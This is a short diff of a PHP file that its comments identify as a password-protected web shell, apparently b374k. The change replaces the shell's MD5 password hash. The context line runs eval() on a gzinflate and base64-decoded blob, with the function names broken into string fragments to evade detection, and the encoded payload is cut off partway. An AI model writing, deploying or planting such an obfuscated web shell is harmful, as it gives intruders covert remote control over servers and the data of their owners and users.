@@ -1,6 +1,6 @@
 <?php
 // shell password, fill with password in md5 format to protect shell
-$s_pass = "99754106633f94d350db34d548d6091a";
+$s_pass = "0de664ecd2be02cdd54234a0d1229b43"; //b374k
 eval("\$x=gzin"."flate(base"."64_de"."code(\"7b1pe+O4lSj8OfM88x8U3XpT5chVXLV1LRlKFEVt1L5QnVw/3EmJm7hTufnvL0BSsmzLd
 lVXpdOTdM/ERYHAOQcHZwVA4NNfXN397/8qKZ7neHee4jpeYNjaO/TmY+l/fCW4CwxLuTMNywiysjf+nS1YSulzqSwSdXJfzooixYMl+Ac8/x0YgQn
 rFLU/lEvlD3m1jyVYaDqaYWegQSWihqKlP5dwEvypZ82FMNDBC1UwfeVjyVDf+YFnKva7wDOsd+C9K/j+zc0X9Obv8KXhAzrfvblrj8eDXufntxldb
